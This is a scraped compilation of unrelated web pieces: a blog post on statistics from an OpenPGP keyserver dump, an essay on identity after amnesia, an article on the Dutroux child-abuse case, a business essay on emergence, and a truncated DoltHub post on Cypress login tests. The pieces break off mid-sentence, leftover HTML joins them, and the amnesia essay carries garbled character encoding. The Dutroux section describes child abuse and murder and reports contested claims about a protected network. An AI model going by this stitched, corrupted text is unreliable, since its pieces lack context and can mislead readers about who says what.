<p>So in June 2019 I fetched a copy of one of the key dumps of the one of the
keyservers (some keyserver publish these copies of their key database so people
who want to join the SKS keyserver network can do an initial import). At that
time the copy of the key database contained 5,499,675 keys and was around 12GB.
Using the <a href="https://github.com/hockeypuck/hockeypuck">hockeypuck keyserver
software</a> I <a href="https://hockeypuck.io/populating.html">imported the
keys</a> into an PostgreSQL database.
Hockeypuck uses a table called <code>keys</code> to store the keys and in there the column
<code>doc</code> stores the OpenPGP keys in JSON format (always with a data field
containing the original unparsed data).</p>
<p>For the thesis I split the analysis in three parts, first looking at the Public
Key packets, then analysing the User ID packets and finally studying the
Signature Packets. To analyse the respective packets I used SQL to export the
data to CSV files and then used the pandas <a href="https://pandas.pydata.org/pandas-docs/stable/reference/api/pandas.read_csv.html">read_csv
method</a>
to create a dataframe of the values. In a couple of cases I did some parsing
before converting to a DataFrame to make the analysis step faster. The parsing
was done using the <a href="https://github.com/toofishes/python-pgpdump">pgpdump python
library</a>.</p>
<p>Together with my advisor I decided to submit the thesis for a journal, so we
revised and compressed the whole paper and the outcome was now</p>
<p>
<a href="http://isyou.info/jowua/papers/jowua-v11n3-6.pdf">PUBLISHED</a>
</p>
<p>in the Journal of
Wireless Mobile Networks, Ubiquitous Computing, and Dependable Applications
(<a href="http://jowua.com/">JoWUA</a>).</p>
<p>I think the work gives some valuable insight in the development of the use of
OpenPGP in the last 30 years. Looking at the public key packets we were able to
compare the different public key algorithms and for example visualize how DSA
was the most used algorithm until around 2010 when it was replaced by RSA.
When looking at the less used algorithms a trend towards ECC based crytography is
visible.</p>
<p>What we also noticed was an increase of RSA keys with algorithm ID 3 (RSA Sign-Only),
which <a href="https://tools.ietf.org/html/rfc4880#section-13.5">are deprecated</a>. When
we took a deeper look at those keys we realized that most of those keys used a
specific User ID string in the User ID packets which allowed us to attribute
those keys to two software projects both using the <a href="http://www.bouncycastle.org/java.html">Bouncy Castle Java
Cryptographic API</a> (resp. the Spongy
Castle version for Android). We also stumbled over a tutorial on <a href="https://bouncycastle-pgp-cookbook.blogspot.com/2013/01/generating-rsa-keys.html">how to create
RSA keys with
Bouncycastle</a>
which also describes how to create RSA keys with code that produces RSA
Sign-Only keys. In one of those projects, this <a href="https://github.com/guardianproject/proofmode/issues/65">was then
fixed</a>.</p>
<p>By looking at the User ID packets we did some statistics about the most used
email providers used by OpenPGP users. One domain stood out, because it is not
the domain of an email provider: <code>tellfinder.com</code> is a domain used in around
45,000 keys. <a href="https://uncharted.software/product/tellfinder/">Tellfinder</a> is a
Big Data analysis software and the UID of all but two of those keys is
<code>TellFinder Page Archiver- Signing Key &lt;support@tellfinder.com&gt;</code>.</p>
<p>We also looked at the comments used in OpenPGP User ID fields. In 2013 Daniel
Kahn Gillmor published a blog post titled <a href="https://debian-administration.org/users/dkg/weblog/97">OpenPGP User ID Comments considered
harmful</a> in which he
pointed out that most of the comments in the User ID field of OpenPGP keys are
duplicating information that is already present somewhere in the User ID or the
key itself. In our dataset 3,133 comments were exactly the same as the name,
3,346 were the same as the domain and 18,246 comments were similar to the local
part of the email address</p>
<p>Last but not least we looked at the signature subpackets and the development of
some of the preferences (<a href="https://tools.ietf.org/html/rfc4880#section-5.2.3.7">Preferred Symmetric
Algorithm</a>, <a href="https://tools.ietf.org/html/rfc4880#section-5.2.3.8">Preferred
Hash Algorithm</a>) that are
being published using signature packets.</p>
<p>Analysing this huge dataset of cryptographic keys of the last 20 to 30 years
was very interesting and I learned a lot about the history of PGP resp.
OpenPGP and the evolution of cryptography overall. I think it
would be interesting to look at even more properties of OpenPGP keys and I also
think it would be valuable for the OpenPGP ecosystem if these kinds analysis
could be done regularly. An approach like <a href="https://metrics.torproject.org/">Tor
Metrics</a> could lead to interesting findings and
could also help to back decisions regarding future developments of the OpenPGP
standard.</p>

The English philosopher John Locke, for example, considered memory to be the foundation of identity. â€˜Consciousness always accompanies thinking,â€™ he wrote in 1694. â€˜And as far as this consciousness can be extended backwards to any past Action or Thought, so far reaches the Identity of that <em>Person</em>.â€™</p>
<p>For most of us, the question of where identity comes from doesnâ€™t have much bearing on day-to-day life. We donâ€™t have to <em>try</em> to remember who we are; it just happens. But for the <a href="https://www.thelancet.com/pdfs/journals/laneur/PIIS1474-4422(18)30444-7.pdf" rel="nofollow noreferrer noopener">growing</a> number of people who survive brain injury every year, it can be a different story. If you survive an accident or an illness that limits your ability to form new memories, leaving you with whatâ€™s called â€˜anterograde amnesiaâ€™, you might be forced to look elsewhere for your sense of self.</p>
<p>Over the past 15 years working at Headway East London, the UK-based brain injury charity, Iâ€™ve met many people for whom anterograde amnesia has been the cause of profound existential <a href="https://aeon.co/essays/matthew-had-a-brain-injury-who-is-he-after-brain-surgery" rel="noopener">change</a>. Sadie, a paediatric nurse and mother of two who survived a stroke. Gretha, a city worker who fell ill with an infection. Henry, a greengrocer who suffered heart failure during a violent assault, his brain starved of oxygen. They have all recovered well from a medical perspective but, because of amnesia, they find new conscious memories difficult â€“ or impossible â€“ to form. As a result, they live with great uncertainty and disorientation, not to mention dramatic restrictions on their day-to-day freedoms.</p>
<p>The ability to form new memories underpins almost all aspects of personal and professional responsibility. Sadie, Gretha and Henry all became unemployed after their brain injuries, and lost many of the connections and roles that gave meaning to their pre-amnesia lives. Both Sadie and Gretha were forced to move home to live with elderly parents, Henry to sheltered accommodation. When they arenâ€™t at home or at Headwayâ€™s centre, all three of them are shadowed every minute of the day by support workers.</p>
<p>The adjustment to amnesia can take a punishing psychological toll. Sadie, for example, lived with terrible anxiety for several years after her stoke. I remember how, as her frustration and panic peaked, she would fly into rages, often targeted at her blameless support worker. In the absence of any conscious recollection of what had led up to these furies, Sadie was at a loss to explain or contextualise them. It seemed to me that, as in a nightmare, she knew only that she didnâ€™t know what was going on.</p>
<p>This is a frightening lesson about what it means to live without the ability to form the conscious thought-memory described by Locke, what psychologists now term â€˜autobiographicalâ€™ memory. Recollecting recent events <a href="https://pubmed.ncbi.nlm.nih.gov/25685356/" rel="nofollow noreferrer noopener">allows</a> a person to orient themselves, ground their sense of identity and maintain a narrative thread that coherently places them in the world.</p>
<p>They have all found new ways to stabilise and feed their sense of self through action</p>
<p>But I want to caution against the idea, intimated by Locke, that the ongoing formation of conscious memory is the same thing as identity. Despite their often-bewildering conditions, every amnesia survivor I know is a distinct, vivid human being â€“ they each have an inimitable character and a strong sense of self. What is it, in the absence of recent memories, that allows them to know who they are?</p>
<p><strong>Many survivors have</strong> significant memories of their pre-injury lives, formed before amnesia set in, and these old memories can help anchor their identities. Sadieâ€™s relationship with her children, for example, is still hugely important to her. But, at the same time, Henry barely ever refers to his life before injury, and some <a href="http://whoareyounow.org/story/nifty" rel="nofollow noreferrer noopener">survivors</a> I know prefer to forget who they used to be. Even when pre-injury memories do play a role, Iâ€™m convinced that few survivors rely on them alone. Instead, Gretha, Sadie and Henry have all found new ways to stabilise and feed their sense of self through action: through habits and roles that allow them to keep growing and learning.</p>
<p>Since his injury, Henry has built a career as an artist. Though his conscious memories of this inevitably fade, he gravitates to the art studio with an unerring reliability, drawn back there by the positive feelings his work produces in him. A couple of years ago he was asked to design a badge for Headway members to wear at an exhibition opening event. It read â€˜ARTISTâ€™. He kept his copy and wears it frequently, though I believe he now has no conscious memory of the event it was made for.</p>
<p>Gretha speaks eloquently about how her own drawing practice, which she started at Headway, helps to orient her: â€˜I know my own handiwork. I know who I am. Itâ€™s not always strong but itâ€™s always me.â€™ She also speaks of its positive influence on her mood, an influence that works even in the absence of conscious recollection: â€˜Iâ€™m happier when Iâ€™ve been in the art studio even if I canâ€™t remember Iâ€™ve been there. Itâ€™s like, even if you havenâ€™t got the Champagne glass in your hand anymore, but you drank the Champagne, do you not feel pissed after?â€™</p>
<p>When Sadie sings during the music sessions at the centre, demonstrating her astonishing range and word-perfect recall of Motown classics, it can feel strange to know how profound her amnesia is outside this context. I also remember a day when one of the staff at Headway brought in her newborn baby to visit. On seeing them, Sadie dropped out of the excitable, somewhat distractible mode that often occupies her at the centre and calmly took the baby in her arms. She cradled the newborn with assurance while asking the mother acute, sensitive questions about its health and sleeping habits.</p>
<p>Sadie has a rich memory of her life before the injury, including her years as a paediatric nurse. The encounter with the baby surely evoked both the â€˜skillsâ€™ associated with that time, or what researchers would <a href="https://pubmed.ncbi.nlm.nih.gov/15037131/" rel="nofollow noreferrer noopener">call</a> â€˜proceduralâ€™ memories, as well as the explicit, autobiographical ones. But I think the experience was more than the sum of these parts; she hadnâ€™t simply reverted to the past. For a moment, and perhaps for the first time since her injury, Sadie was the most centred person in the room: oriented not just to the child in her arms and to the adults around her but to her own identity. I was watching her in the throes of a whole-person, embodied memory: a moment that unified her historical expertise, unconscious physical habits and consciously remembered experiences with her present intentions, bodily sensations and deeply felt emotion. I only wish I had asked her, in that moment, how she felt.</p>
<p>Amnesia survivors are most themselves in contexts that continually reinforce their embodied tendencies</p>
<p><strong>The observation Iâ€™m</strong> trying to make is that personhood isnâ€™t the sole property of the mind, or of the brain, or of any one function of these entities. Personhood is a property of the <em>whole body,</em> and the whole body is implicated in how both personhood and an individual <em>person</em> can persist in the face of perpetual forgetting.</p>
<p>It was reading a blog <a href="https://philosophyofbrains.com/2016/11/15/memory-and-the-self-rilkean-memory.aspx" rel="nofollow noreferrer noopener">post</a> by the philosopher Mark Rowlands, discussing his idea of â€˜Rilkean memoryâ€™, that finally gave me language for this hitherto unspoken intuition. Rowlands chose the name because of something that the poet Rainer Maria Rilke wrote in 1910 about how poetry emerges from memories:</p>
<blockquote>â€¦ memories themselves are not important. Only when they have changed into our very blood, into glance and gesture, and are nameless, no longer to be distinguished from ourselves â€“ only then can it happen that in some very rare hour the first word of a poem arises in their midst and goes forth from them.</blockquote>
<p>Unlike Lockean autobiographical memory, which is a property of conscious thinking alone, Rilkean memory lives in the action of the whole body, arising from the â€˜behavioural dispositionâ€™ or â€˜enduring moodâ€™ thatâ€™s left behind when conscious, narrative memory fades away. When persistent and entrenched enough, Rowlands <a href="https://philosophyofbrains.com/2016/11/16/memory-and-the-self-the-style-of-a-person.aspx" rel="nofollow noreferrer noopener">says</a>, these dispositions and moods become an â€˜existential styleâ€™, a way of being that can hold a person together in the face of â€˜catastrophic memory lossâ€™.</p>
<p>This is what I see in brain injury survivors such as Henry, Gretha and Sadie. When they take part in practices that mean something to them, they become absorbed in living truths that remind them who they are. Amnesia survivors, who have lost the conscious memory-formation so vulnerable to brain injury, are most themselves in contexts that continually reinforce their embodied tendencies, their bodily dispositions and feelings. The places where they are most confident in their identities are the ones in which they are supported not merely to think but to <em>do</em> the things they love. To support these survivors, we must take seriously the idea of whole-body, whole-person memory, and look for ways to reinforce it, wherever we can.</p>
<p>When I wake up each morning, there are things I recognise as part of â€˜meâ€™. The aura of dream is replaced almost immediately by a continuity of thought from the previous day. And behind this are layers of familiar sensation: the dryness of my skin; the exaggerated sensitivity of my hands; the way my eyes want to hide from the daylight; the empty feeling of my typical morning hunger; and the bodily restlessness that will soon get me out of bed. Words are there even before I realise it, and I feel a pang of regret as I break the silence. Then I look at my partner, stirring next to me, and recognise another whole domain of identity: the people I share my life with and the feelings they bring to life. Itâ€™s a cascade of embodiment, of tendency, of self, that emerges. Doubtless, if I survived a brain injury, some of these things might change or disappear. But not all of them.</p></div></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-c46963bdd9e3984b8ce4"><div><p>My country of origin is suffocating under a heavy blanket called denial. Underneath that blanket children are raped, tortured and killed. It affects the atmosphere of the place. Sensitive people visiting there feel that something is off. Its architectural splendor and the pleasant cafe culture are insufficient to  hide the edge to people’s forced indifference, the hopelessness of those who once cared, or the coldness of those who cling to intellect alone. </p><p>The people of Belgium were first confronted with this brutal reality in September 1996. International newspapers and magazines reported about the funerals of two eight year old Belgian girls, starved to death after being kidnapped, abused and abandoned in a dungeon. Main suspect: Marc Dutroux. Within weeks, Belgium was once again in the news. The bodies of two missing teenage girls were unearthed after Dutroux directed investigators to their graves. They were said to be “the victims of a deadly pornography ring.” <em>(</em><a href="http://www.nytimes.com/1996/09/12/news/king-forced-to-step-in-pedophile-scandal-just-one-of-many-belgiums.html?mcubz=1"><em>NY Times, Sept. 12, 1996</em></a><em>).</em> Both discoveries came in the wake of the rescue of two girls, 12 and 14, who were found alive but abused in Dutroux’ dungeon.</p><p>One of Dutroux’ accomplices talked non-stop in the first days after his arrest. “The morning after the kidnapping of [two teenage victims,] Dutroux had an important appointment. He returned at about 5 or 6PM. In regards to [the two girls], he spoke of ordered goods,” he declared. Eight days after the arrest, the accomplice abruptly stopped cooperating with interrogators, claiming: “Michel Nihoul said that if I talk, they will find me, no matter where or when.” Michel Nihoul, a Brussels businessman, was one of the defendants in the case.</p><p>Upon his arrest, Marc Dutroux told reporters he had friends in high places that would protect him, though he soon retracted that statement and denied kidnapping the children to fill an order. An investigation into his finances showed that shortly following several disappearances of Belgian children – not only those named in the Dutroux case, but also two siblings, one of whom was found murdered, and a teenage girl, also murdered – large sums of money were deposited anonymously into several of his or his wife’s bank accounts. Eight years later, in 2004, when the trial was finally getting underway and it was obvious that no friends in high places were protecting him, Dutroux took up his earlier premise with a different twist, declaring: “Just because I did some stupid things doesn’t mean I should have to pay for a mafia system of which I wasn’t the motor.” <a href="https://www.nytimes.com/2004/03/02/world/belgian-faces-trial-at-last-in-sex-killings.html?rref=collection%2Ftimestopic%2FDutroux%2C%20Marc&amp;action=click&amp;contentCollection=timestopics&amp;region=stream&amp;module=stream_unit&amp;version=latest&amp;contentPlacement=8&amp;pgtype=collection&amp;mtrref=www.nytimes.com&amp;gwh=A0B5739B9D93069277C32CAA07178563&amp;gwt=pay" target="_blank"><em>(New York Times March 2, 2004)</em></a></p><p>Late 1996, in the weeks after the discoveries of the four children’s bodies, several witnesses approached investigators of the Dutroux case. These witnesses, who said they survived the child prostitution ring, testified anonymously, under the codename X. They didn’t meet or know each other, yet pointed to the same notables, politicians and defendants in the Dutroux case as belonging to a network, responsible for the abuse and murder of many children. From the X-testimonies, Michel Nihoul, a defendant in the Dutroux case, emerged as having a key role inside the network.</p><p>The witnesses described scenes such as the following: “Unsuspecting, drunken businessmen would be offered a sixteen year old prostitute at a party, who tells him she is only thirteen as soon as they are alone, while their sex act is recorded on video and later used as blackmail, i.e. to obtain a contract.” (X1, named Regina Louf’s autobiography<em>: “Quiet! Children being murdered!” - “Silence, On tue des enfants!)</em> Several X-witnesses describe extreme S&amp;M practices performed with them and other children. Childhood trauma is likely to engender psychological confusion; adult survivors of extreme sexual abuse don’t necessarily make for good witnesses. X1, the most prominent of the X’s, acknowledges she suffers from Multiple Personality Disorder, currently known as Dissociative Identity Disorder, but her testimony stands out because of extremely precise, detailed descriptions. She recalls minutiae of interiors and inflicted wounds, biographical data about victims, victims’ friends, abusers, and people of Michel Nihoul’s intimate circle. Her information enables investigators to link her testimony to several unsolved child murder cases.</p><p>The investigating team tried to establish if the great numbers of child murders maintained by the X-witnesses could be matched with registered numbers of missing and murdered children. They didn’t get very far, since there are no national statistics on child murders and disappearances of minors in Belgium. Several of the regional prosecutor’s offices failed to reply to the investigators’ inquiry. The investigators determined that in the prior twenty years in Belgium, dozens of child murders and disappearances had remained unsolved.</p><p>October 1996. In all major Belgian cities, courthouses were pelted with eggs or hosed down by a furious mob, in reaction to the removal of the magistrate in charge of the Dutroux investigation, who had eagerly promised the public to ‘get to the bottom of this.’ The magistrate was accused of compromising his impartiality by eating a plate of spaghetti at a benefit for families of missing children. <a href="https://www.nytimes.com/1996/10/21/world/275000-in-belgium-protest-handling-of-child-sex-scandal.html" target="_blank"><em>(NY Times, October 21, 1996)</em></a> “”What impartiality?” scoffs one citizen.&nbsp; “Everybody knows this is fiction, that politicians name the judges and the magistrates and that they fix things the way it suits them.” He refers to a longstanding tradition of cronyism in Belgium in which political parties name their candidates, not only for many posts in the official bureaucracy but also in the judiciary”. <em>(NY Times, October 19, 1996)</em> After days of spontaneous protests, 275 000 citizens marched silently through the capital, protesting judicial and political corruption, demanding extensive changes.</p><p>On January 27, 1997, it was decided to reopen the investigation into the unsolved murder of teenager Christine Van Hees, which regained attention thanks to the testimony of X1. On February 13, 1984, the sixteen year old girl was repeatedly raped, tortured and finally set on fire. It was considered an “easy” case because no gendarme or police officials, notables or politicians were named in it. The original murder file already contained leads pointing to Marc Dutroux and Michel Nihoul. These leads were neglected, yet the same examining magistrate who handled the case from 1985 onward was placed in charge of the reinvestigation. At this time it was or should have been known by the Belgian judiciary that this magistrate’s sister was godmother to the son of Michel Nihoul, a suspect in the Van Hees murder file; that this magistrate once acted as a lawyer for Michel Nihoul’s longtime girlfriend, who was also one of the suspects in the case; and that he thanked his appointment to the extreme right wing political milieu of Michel Nihoul and friends, which his investigation should have scrutinized. The progress of the Van Hees murder file was to decide the future of the X-files, since X1 and other X-witnesses became fodder for a huge controversy brewing within the Neufchateau cell, which handled the case, and judiciary circles.&nbsp; </p><p>In 1998, after the press dubbed the two camps ‘believers’ and ‘disbelievers,’ all of Belgium became divided on the X-witness credibility issue. The Van Hees murder case was closed. The other child murder files brought back in focus by X1’s testimony were left untouched and by then the statute of limitations had run out on all of these cases.</p><p>Back at the Dutroux case headquarters, the replacement of the magistrate fired for partiality was skeptical about the X files. He showed more interest in tips coming from a convicted pedophile who led investigators to an alleged mass grave of young victims of the network in an inoperative coal mine. The digging operations lasted six months. Over eight million cubic yards of soil were scooped out. Nothing was found.</p><p>Upon receiving a complaint from a gendarme commander, the cabinet minister’s prosecutor’s office ordered an inquiry into the X1 investigation. X1’s interrogators were immediately put on leave. On the first day of the ‘investigation of the investigation’ the complaint was found to be unsubstantiated, yet the inquiry continued for two years and five months, without yielding a single result. X1’s investigators, though proven blameless, remained on leave.</p><p>The same gendarme commander who filed the complaint also ordered a ‘rereading’ of all the X1 files, even though he was not qualified to do so. The rereading reports suggest that the questions were leading, that the witness had exploited this situation to make up her answers and that she had transposed elements from her normal every day life to the horror stories about the network. </p><p>Early 1998, during a press conference, eleven magistrates solemnly addressed the public. A senior magistrate declared: “Everything has been thoroughly examined; and X1’s testimony is completely worthless.” In the book <em>The X Files: what Belgium was not supposed to know about the Dutroux case</em> (“<em>Les Dossiers X: Ce que la Belgique ne devait pas savoir sur l ‘affaire Dutroux”)</em> the authors examined the entire transcripts of the X1 testimonies and the four reports of the rereading.&nbsp; They were able to establish that the “rereaders” changed quotes from the transcripts, or used isolated bits of text to prove certain points which lost their validity once the excerpts were seen in their proper context. Almost none of the conclusions in the rereading reports survived the double-take. It appears that none of the magistrates who condemned X1’s testimony bothered to check if the reports were accurate.</p><p>On October 22, 2001, the file named Dutroux-bis was officially split off from the Dutroux case. All the issues deferred to this file, including the testimonies of all the X-witnesses, were not going to be addressed during the trial. </p><p>In December, 2001. The Belgian newspaper <em>De Morgen</em> published a list. Eighteen people who were either …</p></div></div></div>

These building blocks can be anything: cell systems that create organs, individual people that create departments of a business, or blocks in a neighborhood that create a city.&nbsp; The key point is the hierarchy.&nbsp; New building blocks can emerge both vertically and horizontally with each subsequent jump up the hierarchy.&nbsp;&nbsp;</p><p>The economy represents the pinnacle of human generated emergence.&nbsp; We start with simple trade - an ear of corn for a bushel of wheat.&nbsp; Then we create a medium of exchange (currency) to facilitate this trade.&nbsp; Many simple transactions, millions of times daily.&nbsp; Next thing we know, we have a global market with basic rules at the core (I mean, we’re just buying and selling stuff to each other!) that create extraordinarily complex behavior that we <a href="https://www.forbes.com/sites/phillipbraun/2020/07/08/stock-market-starts-off-strong-for-q3-despite-covid-19-rise/#446da1c2d5ca">cannot explain</a>.&nbsp;&nbsp;</p><p><strong>At its core, emergence represents the phenomenon of simple mechanisms and rules ultimately producing astoundingly complex behavior, given the right conditions at the right time.&nbsp;</strong></p><p>The <em>three key factors</em> where emergence builds upon and further explains Entropy Theory:</p><ol role="list"><li>If we imagine emergence as building blocks that create opportunities for even more building blocks at higher levels, we find the system continuously creating new business opportunities</li><li>Emergence allows for small effects to become magnified instead of dying away</li><li>Coevolution has emerged as a dominant strategy with "agents" (i.e. businesses) always constantly organizing and reorganizing themselves into larger structures through mutual accommodation and rivalry.</li></ol><p>Let's see how each of these factors plays out in the chaotic world of business.</p><h2><strong>As Commonplace as Air</strong></h2><p>Packy describes the businesses that thrive by creating order out of chaos as <a href="https://notboring.substack.com/p/entropy-theory#:~:text=Everything%20tends%20towards%20chaos%20and,systems%20tend%20to%20maximize%20entropy.">Entropy Wranglers</a>.&nbsp; Think Spotify organizing millions of songs into one place, or even Craigslist connecting neighbors and enabling us to act on our impulsive desires to get rid of our crap to buy more crap.&nbsp; Converting chaos of the market into order.</p><p>Emergence helps us understand <em>how</em> these forces create even more business opportunities.&nbsp; These Entropy Wranglers <strong>sit on top of a hierarchy of existing building blocks</strong>.&nbsp; Without them, these businesses could never exist.&nbsp;&nbsp;</p><p>In his book <a href="https://www.amazon.com/dp/B07WVV5J2R/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1"><em>Complexity: The Emerging Science At the Edge of Order and Chaos</em></a>, Mitchell Waldrop writes:</p><blockquote><em>“This hierarchical, building-block structure of things is as commonplace as air. It’s so widespread that we never think much about it.”&nbsp;&nbsp;</em></blockquote><p>Spotify has emerged as a successful business <strong>because of this hierarchy of underlying building blocks.</strong>&nbsp; Commodification of music, cheap distribution, increasing disposable income, drop in computing power.&nbsp; The list can go on and on.&nbsp; These building blocks have enabled a company like Spotify to exist.&nbsp; And the building blocks of today will determine emergent companies tomorrow, whether or not the Wranglers increase or decrease Entropy.&nbsp;&nbsp;</p><figure><p><img src="https://uploads-ssl.webflow.com/5f6bf2dc627916ea785ce188/5f6f73f23aad7e11b375661c_dependency.png" loading="lazy" alt=""></p></figure><p>Scientist <a href="https://www.youtube.com/watch?v=GVL2Y5z2jLU">Stuart Kauffman</a> helps us to further understand the potential emergent businesses of tomorrow with the idea of <strong>adjacent possible empty niches.</strong> These are niches that exist right now which have not been built on top of yet, but <em>could</em> be with limitless number of possibilities.&nbsp;&nbsp;</p><p>Bear with me as we put our evolution hat on to understand this profound idea. Kauffman provides a fun example of a Sunfish that evolved a special swim bladder to help it stay buoyant.&nbsp; This swim bladder ended up creating a niche for bacteria to live in <em>without any natural selective pressures on the bacteria itself.</em> In other words, a building block meant for one purpose (helping a fish stay buoyant) created an opportunity for another organism to thrive and create <strong>a whole new set of building blocks for the environment to use.</strong>&nbsp;&nbsp;&nbsp;</p><p>This is radical emergence in the form of <strong>adjacent possible empty niches</strong>: we couldn’t have predicted it ahead of time and it changed the course of evolution (new species of bacteria interacting with a new habitat). We see this exact behavior of adjacent possible empty niches in the business world.&nbsp;</p><p>A simple example: when the US Navy began using the <a href="https://en.wikipedia.org/wiki/Computer#First_computing_device">first electromechanical computers in 1938</a> aboard submarines, no one could have possibly predicted Facebook, let alone even the concept of cloud computing.&nbsp; But the building block of an information processor created opportunities in the business ecosystem that had never existed before.&nbsp;&nbsp;</p><p>COVID-19 has brought us to a tipping point of the mass creation of these <strong>adjacent possible empty niches.</strong> In <em>Complexity</em>, Waldrop describes this tipping point as the <em>edge of chaos</em>: a phase transition that redefines the environment on top of both increasing and decreasing entropy.&nbsp; Another analogy: water is on the “edge of chaos” when transitioning from liquid to ice.&nbsp; New building blocks, unable to be predicted, that never existed before.&nbsp;</p><p>The movement to the edge of chaos provides incredible opportunities for new businesses that couldn’t have possibly existed prior.</p><p>Let’s take an example of education on this edge of chaos. Some of the building blocks here are:&nbsp;</p><ul role="list"><li>rise of easy to use no code tools</li><li>ubiquity of Zoom</li><li>changing social dynamics and expectations</li></ul><p>These allow for new pockets of educational niches to explode. Homeschooling niches suddenly emerge.&nbsp; It’s a niche that’s always existed, but never taken off because the right building blocks beneath it weren't in place.&nbsp; Now it’s getting <a href="https://techcrunch.com/2020/05/12/homeschooling-startup-primer-closes-3-7m-seed-round-led-by-founders-fund/?guccounter=1&amp;guce_referrer=aHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8&amp;guce_referrer_sig=AQAAAFmkIg7cQz8Ub-JfqmWJZUp1FY626CJjOxnHdx60o19RIvaAntqH8VqDFVYIVqXn6p3bNzIjD_Pltmnse9g5Z06md18LmJMpPNBQAiiG5v7jiA8tosFR4AKW4hYUqiIBeAqX2i5iAUbKzrh_aa1WDJlWlmc-Dy8ywyGlF2zSi1ZW">venture funding</a>!</p><p>If we go back to Entropy Theory, we can predict that new businesses will emerge out of the building blocks of these new, fragmented homeschooling businesses, aggregating demand and creating order out of this new niche.</p><p>We can also look at the effects of emergence and Entropy Theory on offices and employment. The days of the static 9-5 and 100 year office building leases are over; in come the WeWork mimics, the distributed workplaces, and the passion economy.&nbsp; Entropy increases.&nbsp; This increasing disorder creates <strong>new adjacent possibly empty niches</strong> that businesses can fill.&nbsp;&nbsp;</p><p>Let’s speculate (because by definition, we can’t know what will happen).&nbsp; If everyone works for themselves or at home, how does transportation work?&nbsp; One hierarchical level above, we <strong><em>could</em></strong> imagine lightweight transportation becoming ubiquitous.&nbsp; People don't need cars to drive 1.5-2 hours to work everyday. Speculating even further, what building blocks could this new transportation system create <strong>two</strong> levels above?&nbsp;&nbsp;</p><p>Waldrop sums up the endless emergent business opportunities and niches better than I can:</p><blockquote><em>“Thus, the economic world has a place for computer programmers, plumbers, steel mills, and pet stores, just as the rain forest has a place for tree sloths and butterflies. Moreover, the very act of filling one niche opens up more niches—for new parasites, for new predators and prey, for new symbiotic partners.&nbsp; </em><strong><em>So new opportunities are always being created by the system</em></strong><em>.&nbsp;</em></blockquote><blockquote><em>And that, in turn, means that it’s essentially meaningless to talk about [an industry] being in equilibrium: the system can never get there. It is always unfolding, always in transition.”</em></blockquote><h2><strong>Small Effects Become Magnified</strong></h2><p>When I worked in finance, Excel was our unsurprising tool of choice.&nbsp; We wouldn’t even entertain the idea of using anything else.&nbsp; Even when it crashed on my Mac or I had to send a file to my boss titled v<em>ersion_dan_463478_i_promise_this_is_final</em>, we never questioned the tool.</p><p>Excel is so damn ubiquitous.&nbsp; It’s been used forever.&nbsp; It’s wedged into our business culture, unmoving, orderly, surprisingly free of entropy.</p><p>But the tide is shifting against Excel.&nbsp; <a href="https://en.wikipedia.org/wiki/Eric_Vishria">Eric Vishria</a>, partner at venture fund Benchmark, describes a <a href="http://investorfieldguide.com/eric-vishria-the-past-present-and-future-of-saas-software/">new era of SaaS company strategy</a> with a “try and toss” model.&nbsp; Software companies have shifted from selling to an entire organization in a top down approach to a bottoms up approach, focusing on smaller teams.&nbsp; It’s easier for small teams to try out a product rather than convincing a whole department.&nbsp; Doesn’t hurt that the cost of shipping software to customers has also plummeted, lowering the barriers to entry for competitors.</p><p>These two key building blocks have enabled a whole new breed of companies to flock to this niche to dethrone Excel.&nbsp; Teams can try software like Airtable, Anaplan, Smartsheet, Asana, etc. without having to convince their entire organization.&nbsp; For the first time in decades, knowledge workers have viable options to use instead of Excel.&nbsp;</p><p>Bringing this back to emergence and Entropy Theory:</p><p>Even in business areas with low entropy, small, seemingly mundane behaviors coupled with a changing environment can produce surprising new businesses.&nbsp; The adjacent possible niche to compete against Excel didn’t exist until these subtler business strategies changed.&nbsp; Once they did, an explosion of new companies came to fill it.</p><h2><strong>Coevolution</strong></h2><p>While Entropy Theory explains how certain companies capture value …</p></div></div></div>

<ul>
<li><a href="https://www.dolthub.com/blog/2020-08-10-testing-dolthub-cypress">Why we chose Cypress, setting up and writing tests, some examples and downsides</a></li>
<li><a href="https://www.dolthub.com/blog/2020-08-17-cypress-open-source">Making our Cypress tests open source and some gotchas we found converting to Typescript</a></li>
</ul>
<p>We made our Cypress tests open source in August and you can check out the tests we've written so far in our <a href="https://github.com/dolthub/dolthub-cypress"><code>dolthub-cypress</code> repository on GitHub</a>. As of a few days ago, we only had tests for our public-facing pages.</p>
<p>It’s our goal to get full Cypress test coverage of all our DoltHub pages. We were inspired by how successful our <a href="https://www.dolthub.com/blog/2020-03-23-testing-dolt-bats">Bats tests</a> were for testing the Dolt command line and we chose Cypress in hopes of having an equivalent for DoltHub. Our Cypress tests now support DoltHub login, which not only allows us to test our login workflow, but also to test our pages that require authentication.</p>
<p>Cypress has an awesome Chrome UI where you can watch your tests run against your web page. You can see a user successfully being logged in as our tests are running:</p>
<p><img src="https://www.dolthub.com/blog/0f950505e186cecdd738c44bff247f1b/cypress-profile-discover-3.gif" alt="Discover profile tests with login"></p>
<h2>A comparison of two login options</h2>
<p>The <a href="https://docs.cypress.io/examples/examples/recipes.html#Logging-In">Cypress docs</a> have a few recipes for various login options. Having the ability to log in a user with Cypress accomplishes two goals:</p>
<ol>
<li>Test the login workflow on <a href="https://www.dolthub.com/signin">our signin page</a></li>
<li>Test other pages that require a logged in user like <a href="https://www.dolthub.com/profile">our profile page</a></li>
</ol>
<p>I decided to compare using an API request with using our HTML form to log in a user. Using the HTML form directly to test the login workflow on the signin page (goal #1) was obviously going to be the way to go. The point of using Cypress is to test how a user would interact with our website.</p>
<p>However, was navigating to the <code>/signin</code> page and logging in using the HTML form necessary for testing every single page that requires a logged in user (goal #2)? This is where logging in using our API could come in handy.</p>
<h3>Logging in using our API</h3>
<p>Using our API to log in seemed like faster and more efficient way to test private paths. We have a few endpoints exposed for our <a href="https://www.dolthub.com/blog/2020-08-21-dolthub-repository-apis">DoltHub SQL API</a>, so I decided to temporarily create and test out a <code>/login</code> endpoint.</p>
<p>While this required a little more time to get working, it was very fast to run. This is what that code ended up looking like:</p>
<div data-language="typescript"><pre><code><span>function</span> <span>loginUsingAPI</span><span>(</span>username<span>:</span> <span>string</span><span>,</span> password<span>:</span> <span>string</span><span>)</span> <span>{</span>
  
  cy<span>.</span><span>request</span><span>(</span><span>{</span>
    url<span>:</span> <span>"/api/v1alpha1/login"</span><span>,</span>
